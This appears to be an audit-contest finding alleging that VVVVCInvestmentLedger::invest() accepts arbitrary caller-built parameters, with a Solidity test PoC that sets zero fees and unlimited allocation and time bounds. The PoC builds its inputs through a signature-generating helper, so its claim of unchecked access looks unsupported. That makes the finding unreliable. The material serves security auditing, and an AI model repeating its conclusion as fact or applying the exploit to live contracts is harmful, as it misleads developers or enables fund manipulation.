# Lack of proper check for `VVVVCInvestmentLedger::invest()` function

### Summary

the invest() function is used in the protocol to provide a way for users to invest in the incoming projects that are going to be launched and the protocol explicitly says in the docs that "In the case of VVVVCInvestmentLedger:invest() the centralized system generates approved input parameters, and the contract ensures that these validated parameters aren't exceeded". However this function is a public function which no modifiers and anyone calls it and it takes a single struct as an input which anybody can easily construct it by their own.

### Root Cause

https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCInvestmentLedger.sol#L141C5-L205C6

### Internal pre-conditions

anyone can construct arbitrary struct input and call the invest() function

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Anyone can easily make their own input and potentially do things like: setting 0 as fees, bypassing time and allocation limitations, setting a favorable numerator and denumerator for rates etc.

### PoC

add this block of code to the `VVVVCInvestmentLedger.unit.t.sol` file:
```Solidity
    function test_investLackOfCheck() public {
        // Generating fake params
        VVVVCInvestmentLedger.InvestParams memory params = generateInvestParamsWithSignature(
            sampleInvestmentRoundIds[0],
            investmentRoundSampleLimit,
            sampleAmountsToInvest[0],
            type(uint256).max, // infinite allocation
            exchangeRateNumerator,
            0, // making fee 0
            sampleKycAddress,
            0, // 0 timestamp for round start
            type(uint256).max // infinite timestamp for round end
        );
        
        uint256 preInvestBalance = PaymentTokenInstance.balanceOf(sampleUser);

        investAsUser(sampleUser, params);

        // still the transaction goes through and passes the same checks for "testInvest" function in this file
        assertTrue(PaymentTokenInstance.balanceOf(address(LedgerInstance)) == params.amountToInvest);
        assertTrue(PaymentTokenInstance.balanceOf(sampleUser) + params.amountToInvest == preInvestBalance);
    }
```
